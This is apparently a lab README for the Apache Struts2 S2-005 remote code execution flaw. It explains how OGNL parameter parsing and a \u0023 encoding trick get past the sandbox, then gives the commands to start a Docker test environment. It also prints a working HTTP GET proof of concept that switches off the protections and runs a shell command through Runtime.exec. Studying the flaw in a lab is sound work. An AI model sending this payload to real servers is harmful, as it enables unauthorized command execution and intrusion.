# S2-005 Remote Code Execution Vulnerability

Impact version: 2.0.0 - 2.1.8.1
Vulnerability details: http://struts.apache.org/docs/s2-005.html

## Principle

Refer to Wu Hanqing's book "White Hat on Web Security".

> The origin of the s2-005 vulnerability originates from S2-003 (affected version: lower than Struts 2.0.12), and struts2 will parse each parameter name of http into an ong statement (considered as java code). The ongl expression accesses the struts object via #, and the struts framework prevents security issues by filtering # characters. However, the unicode encoding (\u0023) or octal (\43) bypasses the security restrictions. For the S2-003 vulnerability, The official patched by adding security configuration (disabling static method calls and class method execution, etc.), but the security configuration was bypassed again causing the vulnerability, and the attacker could use the OGNL expression to open these two options, the patching scheme of S2-003 Put yourself in a lock, but put the lock key on the lock

XWork will parse the keys and values ​​of the GET parameter into Java statements using OGNL expressions, such as:

```
User.address.city=Bishkek&user['favoriteDrink']=kumys
//will be converted into
action.getUser().getAddress().setCity("Bishkek")
action.getUser().setFavoriteDrink("kumys")
```

The triggering vulnerability is to take advantage of this point, and in conjunction with OGNL's sandbox bypass method, constitutes S2-003. The official fix for 003 is to add a safe mode (sandbox). S2-005 closes the safe mode in the OGNL expression and bypasses the repair method. The overall process is as follows:

- S2-003 Use `\u0023` to bypass the defense of s2 against `#`
- S2-003 officially added security mode (sandbox)
- S2-005 Use the OGNL expression to close the sandbox and continue executing the code

## surroundings

Run the following command to start the s2-001 test environment.

```
Docker-compose build
Docker-compose up -d
```

## POC && EXP

Execute any command POC (no echo, space with `@` instead):

```
GET /example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution% 5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success% 22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
Host: target:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36


```

Some POCs on the Internet will return to 400 under tomcat8. After researching it, I found that the characters `\`, `"` can't be placed directly in the path, need urlencode, and then send it after encoding. This POC is not echoed.

POC used OGNL's Expression Evaluation:

![](1.jpeg)

It can be understood that `a(aaa)(bbb)` aa is used as the OGNL expression string, and bbb is the root object of the expression. Therefore, if the aaa position needs to execute the code, it needs to be wrapped in quotation marks, and the bbb position can be Place the Java statement directly. `(aaa)(bbb)=true` is actually `aaa=true`. However, how to understand exactly, it needs further research and needs to be optimized.

I look forward to studying the POC that has been echoed.